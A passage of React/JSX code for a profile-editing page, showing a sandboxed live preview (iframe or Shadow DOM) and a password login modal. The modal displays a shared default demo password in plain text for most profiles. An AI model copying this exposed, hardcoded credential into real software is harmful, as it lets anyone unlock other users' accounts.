              </div>
            )}
          </div>
            </>
          )}
        </div>

        {/* RIGHT PANE: Live Sandboxed Profile Preview (Width: 58%) */}
        <div className="w-full md:w-[55%] lg:w-[58%] flex flex-col bg-slate-950 p-3 sm:p-4 overflow-hidden">
          {!isOwner && (
            <div className="flex items-center justify-between px-3.5 py-2 mb-2 rounded-xl bg-slate-900/95 border border-amber-500/30 text-xs text-amber-300 shadow-md flex-shrink-0">
              <div className="flex items-center gap-2">
                <Lock className="w-3.5 h-3.5 text-amber-400 flex-shrink-0" />
                <span>
                  <strong>Read-Only Preview:</strong> Viewing <strong>@{profile.username}</strong>&apos;s published space.
                </span>
              </div>
              <span className="text-[11px] font-mono text-slate-400 hidden sm:inline">
                Editing locked until owner login
              </span>
            </div>
          )}
          {sandboxMode === 'iframe' ? (
            <SandboxedFrame
              profile={profile}
              sanitizedCss={cssAudit.sanitizedCss}
              viewport={viewport}
              onViewportChange={setViewport}
            />
          ) : (
            <div className="flex-1 flex flex-col h-full bg-slate-950 border border-slate-800 rounded-xl overflow-hidden shadow-2xl p-4">
              <div className="flex items-center justify-between pb-3 mb-3 border-b border-slate-800 text-xs">
                <div className="flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4 text-emerald-400" />
                  <span className="font-bold text-slate-200">Shadow DOM Root Sandbox</span>
                  <span className="text-[10px] px-2 py-0.5 rounded bg-purple-500/20 text-purple-300 font-mono">
                    contain: content;
                  </span>
                </div>
              </div>
              <div className="flex-1 overflow-auto">
                <ShadowDomSandbox
                  profile={profile}
                  sanitizedCss={cssAudit.sanitizedCss}
                />
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Login Authentication Modal */}
      {showLoginModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
          <div className="w-full max-w-md bg-slate-900 border border-slate-700 rounded-2xl p-6 shadow-2xl relative space-y-5 animate-scale">
            <button
              type="button"
              onClick={() => {
                setShowLoginModal(false);
                setLoginError('');
              }}
              className="absolute top-4 right-4 p-1.5 text-slate-400 hover:text-white rounded-lg hover:bg-slate-800 transition-colors cursor-pointer"
            >
              <X className="w-4 h-4" />
            </button>

            <div className="flex items-center gap-3">
              <div className="w-12 h-12 rounded-xl bg-indigo-500/10 border border-indigo-500/30 flex items-center justify-center text-indigo-400 flex-shrink-0">
                <Lock className="w-6 h-6" />
              </div>
              <div>
                <h3 className="text-lg font-bold text-white">Log In to @{profile.username}</h3>
                <p className="text-xs text-slate-400">Authenticate to edit and save changes to this space</p>
              </div>
            </div>

            <form onSubmit={handleLogin} className="space-y-4">
              <div className="space-y-1.5">
                <label className="text-xs font-semibold text-slate-300">Profile Password</label>
                <input
                  type="password"
                  value={loginPassword}
                  onChange={(e) => setLoginPassword(e.target.value)}
                  placeholder="Enter password"
                  autoFocus
                  required
                  className="w-full px-3.5 py-2.5 text-sm bg-slate-950 border border-slate-700 rounded-xl text-white font-mono focus:outline-none focus:border-indigo-500"
                />
                {profile.username.toLowerCase() !== 'kevin' && (
                  <p className="text-[11px] text-slate-400">
                    Default demo password: <span className="font-mono text-indigo-300 font-bold">teramee2026</span>
                  </p>
                )}
              </div>

              {loginError && (
                <div className="p-2.5 rounded-lg bg-rose-500/10 border border-rose-500/20 text-rose-300 text-xs">
                  {loginError}
                </div>
              )}

              <div className="pt-2 flex items-center justify-end gap-2">
                <button
                  type="button"
                  onClick={() => setShowLoginModal(false)}
                  className="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold cursor-pointer"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={isLoggingIn || !loginPassword}
                  className="px-5 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-bold transition-all disabled:opacity-50 cursor-pointer shadow-md shadow-indigo-500/20"
                >
                  {isLoggingIn ? 'Logging in...' : 'Log In & Unlock'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}
